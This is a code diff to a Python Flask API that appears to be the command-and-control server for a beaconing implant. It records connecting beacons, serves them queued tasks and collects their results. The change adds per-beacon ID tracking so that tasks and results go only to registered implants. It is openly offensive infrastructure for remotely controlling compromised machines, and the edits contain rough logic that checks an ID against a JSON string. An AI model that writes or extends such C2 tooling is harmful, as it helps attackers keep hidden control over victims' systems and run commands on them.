@@ -1,12 +1,12 @@
 #!/usr/bin/python3
-import uuid
 import json
-import shortuuid
 
 from flask import request, Response
 from flask_restful import Resource
 from database.db import initialize_db
 from database.models import Task, Result, TaskHistory, Register, Pinger
+
+my_list = []
 
 class Registers(Resource):
     def get(self):
@@ -22,6 +22,11 @@ class Registers(Resource):
             body = request.get_json()
             print("Beacon Connected: {}".format(body))
             json_obj = json.loads(json.dumps(body))
+            for key in json_obj.keys():
+                # Look for beacon UUID and add it to our list
+                if (key == "beacon_id"):
+                    my_list.append(json_obj[key])
+                    print(my_list)
             Register(**json_obj).save()
             return "Sucess!", 200
         else:
@@ -89,14 +94,17 @@ class Tasks(Resource):
 
 class Results(Resource):
     # ListResults
-    def get(self):
-        # Get all the result objects and return them to the user
-        results = Result.objects().to_json()
-        Result.objects().delete()
-        return Response(results, mimetype="application.json", status=200)
+    def get(self,beacon_id):
+        if beacon_id in my_list:
+            results = Result.objects().to_json()
+            print(results)
+            Result.objects().delete()
+            return Response(results, mimetype="application/json", status=200) # Get all the result objects and return them to the user
+        else:
+            return Response("Not Found", mimetype="text", status=404)
 
     # AddResults
-    def post(self):
+    def post(self,beacon_id):
         # Check if results from the implant are populated
         if str(request.get_json()) != '{}':
             # Parse out the result JSON that we want to add to the database
@@ -108,15 +116,24 @@ class Results(Resource):
             Result(**json_obj).save()
             # Serve latest tasks to implant
             tasks = Task.objects().to_json()
-            # Clear tasks so they don't execute twice
-            Task.objects().delete()
-            return Response(tasks, mimetype="application/json", status=200)
+            json_obj = json.loads(json.dumps(tasks))
+            if beacon_id in json_obj:
+                # Clear tasks so they don't execute twice
+                Task.objects().delete()
+                return Response(tasks, mimetype="application/json", status=200)
+            else:
+                return Response("{}", mimetype="application/json", status=200)
         else:
             # Serve latest tasks to implant
             tasks = Task.objects().to_json()
-            # Clear tasks so they don't execute twice
-            Task.objects().delete()
-            return Response(tasks, mimetype="application/json", status=200)
+            json_obj = json.loads(json.dumps(tasks))
+            if beacon_id in json_obj:
+                Task.objects().delete()
+                return Response(tasks, mimetype="application/json", status=200)
+            else:
+                # Clear tasks so they don't execute twice
+                #Task.objects().delete()
+                return Response("{}", mimetype="application/json", status=200)
 
 
 class History(Resource):
